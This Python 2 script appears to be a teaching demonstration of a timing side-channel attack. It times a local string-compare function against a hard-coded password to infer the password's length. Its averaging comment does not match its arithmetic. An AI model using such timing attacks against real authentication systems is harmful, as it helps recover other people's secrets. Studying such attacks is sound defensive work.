import sys
import time
from compareString import *

class StringComparer:

	def __init__(self, password, avglen=10):
		# create array of all possible legal characters found in a password
		self.characters = map(chr, xrange(33, 127))
		self.password = password
		self.avglen = avglen

	# returns password length vulnerability
	def length_atk(self):
		time_list = {}

		# assumes average password length of up to 10 characters
		for i in xrange(self.avglen):
			string1 = 'x' * i
			time_list[i] = []
			time_list[i] = self.time_loop(string1, 1000)

		# string length that took the longest time == correct length of password
		return max(time_list, key=time_list.get)

	# runs compare string function vulnerable count no. of times
	def time_loop(self, string1, count):
		time_list = []
		# averages out of 1000 runs for accuracy
		for i in xrange(count):
			start = time.time()
			compare(string1, self.password)
			time_list.append(time.time() - start)
		return sum(time_list)/10.0




if __name__ == '__main__':
	string2 = 'password1'
	stringHack = StringComparer(string2)
	length = stringHack.length_atk()
	print length






